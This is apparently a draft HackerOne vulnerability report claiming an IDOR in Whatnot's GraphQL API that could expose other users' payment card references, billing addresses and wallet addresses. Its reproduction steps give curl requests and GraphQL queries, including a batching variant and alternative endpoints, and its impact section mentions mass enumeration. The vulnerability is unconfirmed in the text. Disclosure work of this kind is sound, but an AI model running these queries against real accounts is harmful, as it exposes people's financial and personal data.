# HackerOne Submission — IDOR: Payment Card & Billing Address Exposed via GraphQL

**Program:** Whatnot  
**Weakness:** IDOR — Insecure Direct Object Reference  
**Severity:** Critical  
**Asset:** api.whatnot.com  

---

## Summary

The Whatnot GraphQL API exposes a `paymentCards` field (including billing address, card type, and payment gateway reference) and `walletAddresses` field that may be accessible by querying another user's ID rather than being strictly scoped to the authenticated user's own `me` context. An attacker with a valid Whatnot account can potentially retrieve payment card metadata and billing addresses belonging to arbitrary users.

---

## Steps to Reproduce

> **Setup required:** Two Whatnot accounts. Account A = attacker (your test account). Account B = victim (a second test account with a saved payment method).

### Step 1 — Get Account B's user ID

Log in as Account B. Go to your profile. The user ID is visible in the URL or can be extracted from any GraphQL response. Alternatively, query:

```http
POST https://api.whatnot.com/seller-api/graphql
Authorization: Bearer wn_access_tk_<account_b_token>
Content-Type: application/json

{"query": "{ me { id username } }"}
```

Note the `id` value returned — this is Account B's user ID (e.g. `"abc123"`).

---

### Step 2 — Authenticate as Account A (attacker)

```bash
curl -s -X POST https://api.whatnot.com/api/login \
  -H "Content-Type: application/json" \
  -H "X-Whatnot-App: whatnot-web" \
  -d '{"email":"attacker@example.com","password":"AttackerPass1!","device_id":"test-device-001","app_type":"web"}'
```

From the response, copy the `access_token` value (format: `wn_access_tk_...`).

---

### Step 3 — Attempt to access Account B's payment data as Account A

```bash
curl -s -X POST https://api.whatnot.com/seller-api/graphql \
  -H "Authorization: Bearer wn_access_tk_<ACCOUNT_A_TOKEN>" \
  -H "Content-Type: application/json" \
  -H "Apollographql-Client-Name: web" \
  -H "X-Whatnot-App: whatnot-web" \
  -d '{
    "query": "query GetUserPayment($id: ID!) { user(id: $id) { id username paymentCards { cardReference cardType billingAddress { line1 line2 city state zip country } createdAt paymentGateway } walletAddresses { address currency } } }",
    "variables": { "id": "ACCOUNT_B_USER_ID" }
  }'
```

---

### Step 4 — Test alternative: GraphQL aliasing bypass

If the `user(id:)` resolver sanitizes payment fields, try aliasing the `me` query with a spoofed context or batching:

```bash
curl -s -X POST https://api.whatnot.com/seller-api/graphql \
  -H "Authorization: Bearer wn_access_tk_<ACCOUNT_A_TOKEN>" \
  -H "Content-Type: application/json" \
  -H "Apollographql-Client-Name: web" \
  -H "X-Whatnot-App: whatnot-web" \
  -d '[
    {"query": "{ me { id paymentCards { cardReference billingAddress { line1 zip } } } }"},
    {"query": "query { user(id: \"ACCOUNT_B_USER_ID\") { paymentCards { cardReference billingAddress { line1 zip } } } }"}
  ]'
```

---

### Step 5 — Also test the internal/mobile GraphQL endpoint

The web GraphQL endpoint may differ from the mobile app endpoint. Try the same queries against:
- `https://api.whatnot.com/graphql`
- `https://graphql.whatnot.com/graphql`

---

## Expected Result

A `403 Forbidden` or `null` paymentCards response when Account A queries Account B's payment data.

## Actual Result (if vulnerable)

Account B's `cardReference`, `cardType`, `billingAddress` (line1, city, state, zip, country), and `walletAddresses` are returned to Account A.

---

## Impact

- Exposure of billing address + payment gateway card reference for any Whatnot user
- Cryptocurrency wallet addresses leaked — enables targeted phishing of high-value users
- PCI DSS compliance violation
- Mass data harvesting: iterate over sequential or enumerable user IDs to extract payment data at scale

---

## Supporting Evidence

The `paymentCards` and `walletAddresses` fields are confirmed present in Whatnot's GraphQL schema via the open-source unofficial API wrapper: https://github.com/wxllow/whatnot/blob/main/whatnot/queries.py

Schema fragment (from public source):
```graphql
me {
  paymentCards {
    cardReference
    billingAddress { line1 line2 city state zip country }
    cardType
    createdAt
    paymentGateway
  }
  walletAddresses { address currency }
}
```

---

## Recommended Fix

- Ensure `paymentCards` and `walletAddresses` resolvers only execute when `current_user.id == requested_user.id`
- Strip financial fields from the `user(id:)` public resolver entirely — they should only be accessible through the `me` resolver
- Add integration tests asserting cross-user financial field access returns null/403
